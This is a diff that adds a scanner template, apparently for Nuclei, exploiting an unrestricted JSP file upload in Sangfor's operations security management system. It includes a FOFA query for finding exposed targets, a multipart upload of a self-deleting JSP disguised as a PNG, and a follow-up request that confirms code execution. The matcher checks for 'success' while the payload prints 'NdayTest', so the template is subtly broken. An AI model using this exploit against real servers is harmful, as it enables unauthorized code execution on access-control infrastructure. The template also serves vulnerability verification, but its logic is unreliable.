@@ -1,0 +1,43 @@
+id: sangfor-om-commonjsp-file-upload
+
+info:
+  name: 深信服运维安全管理系统 common.jsp 非受控文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/fort/login" && header="FORTSESSIONID"
+      该组件在文件上传流程中缺乏有效校验机制，攻击者可通过构造特定请求实现非授权文件写入，导致服务器端任意代码执行风险。
+  tags: 深信服运维安全管理系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /fort/trust/version/common/common.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Language: zh-CN,zh;q=0.9
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+    Content-Disposition: form-data; name="file"; filename="NTest.jsp"
+    Content-Type: image/png
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+- raw:
+  - |
+    GET /fort/trust/version/common/NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
